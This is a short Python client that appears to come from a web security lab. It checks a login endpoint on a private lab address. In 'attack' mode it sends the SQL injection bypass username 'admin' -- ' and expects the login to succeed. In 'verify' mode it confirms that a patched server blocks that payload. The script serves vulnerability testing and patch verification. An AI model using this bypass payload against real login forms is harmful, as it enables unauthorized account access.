#!/usr/bin/env python3
import json
import sys
from pathlib import Path
from urllib.parse import urlencode
from urllib.request import urlopen

URL = "http://172.29.110.20:8080/login"
LOG = Path("/home/ubuntu/web-lab/client.log")

def check(user, password, expected):
    query = urlencode({"user": user, "password": password})
    with urlopen(URL + "?" + query, timeout=8) as response:
        actual = json.load(response)["outcome"]

    print(f"{expected} -> {actual}", flush=True)
    if actual != expected:
        sys.exit("FAILED: UNEXPECTED_RESPONSE")

    with LOG.open("a") as f:
        f.write(actual + "\n")

if len(sys.argv) != 2:
    sys.exit("Usage: sqli_client.py attack|verify")

if sys.argv[1] == "attack":
    check("reader", "Reader2026!", "LEGIT_LOGIN_OK")
    check("admin' -- ", "wrong", "VULN_BYPASS")
    print("SQLI_ATTACK_VERIFIED")

elif sys.argv[1] == "verify":
    check("admin' -- ", "wrong", "SAFE_BLOCKED")
    check("reader", "Reader2026!", "SAFE_LEGIT_OK")
    print("PATCH_VERIFIED")

else:
    sys.exit("UNKNOWN_MODE")
